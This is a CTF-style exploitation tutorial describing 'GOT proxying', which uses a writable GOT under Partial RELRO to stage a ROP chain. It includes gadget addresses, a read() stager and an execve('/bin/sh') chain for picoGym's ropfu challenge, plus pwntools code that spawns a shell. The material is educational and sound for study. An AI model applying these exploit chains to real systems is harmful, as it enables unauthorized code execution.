---
description: A cool technique where you can utilize Partial RELRO to bypass ASLR with ROP
---

# GOT Proxying

This is an interesting technique you can use for ROP chains, in the specific case of GOT being writable. This is very useful since the GOT is basically static addresses which are easy to obtain, **but will require a PIE base leak if PIE is enabled.**

It essentially works by first having a stager to read input from `stdin`, where it reads into the GOT entry (and optionally the next entries incase you want to write full NULLs for `envp` and `argv` in `execve`). Once this is done, you can now utilize this GOT entry for syscalls like `open()` without having to worry about the stack.

This is very beneficial for cases where:
1. The `/bin/sh` string is not present (maybe it's statically compiled and it wasn't included, maybe you don't have the right `libc`, etc.)
1. The registers containing stack addresses either don't exist or no `xchg` (or similar) gadgets exist

## Example

I'm going to be using `BINEX/ropfu` in the picogym as an example for this technique. It's an x32 binary, but this same technique also applies to x64.

First, define our gadgets.

Do note that, when using `ROPgadget` or whatever tool to find gadgets, you must run it with `--multibr`. This is because `int 0x80` (or `syscall`) gadgets **NEED** a `ret` somewhere at the end for the first syscall, and you must ensure you use the appropriate system call gadget.

```python
int_0x80 = 0x0807163f # int 0x80 ; ret
pop_edx_ebx = 0x080583b9 # pop edx ; pop ebx ; ret
pop_ecx = 0x08049e29 # pop ecx ; ret
pop_eax = 0x080b073a # pop eax ; ret
```

Next, start off our actual ROP payload with a stager, where we call `read()` and read into the GOT entry.

```python
payload = b"x"*0x1c # padding to get to RIP
GOT_entry = 0x080e501c
payload += flat([
    pop_edx_ebx,
    100, #EDX=100 (count)
    0, #EBX=0 (stdin)

    pop_ecx,
    GOT_entry, #ECX=GOT_entry (dst)

    pop_eax,
    3, #EAX=read syscall number

    int_0x80
])
```

Once this syscall executes, our input is now read into the GOT. We can then go ahead and run `execve()` with all the strings/string arrays in that GOT entry.

```python
payload += flat([
    pop_eax,
    0xb, #EAX=execve syscall number

    pop_edx_ebx,
    GOT_entry+8, #EDX=envp string array (will point to NULL thus meaning empty)
    GOT_entry, #EBX=filename (should be /bin/sh)

    pop_ecx,
    GOT_entry+8, #ECX=argv string array (like above, empty)

    int_0x80
])
```

Now, we just need to ensure that we send in `/bin/sh\x00` (nullbyte to pad it to a multiple of 4 for x32 and 8 for x64). We also use another GOT entry, again, for `envp` and `argv`.

```python
p.sendlineafter(b"grasshopper!\n", payload)
p.sendline(b"/bin/sh\x00" + p32(0)) # shell and also a zero for the execve
p.interactive()
```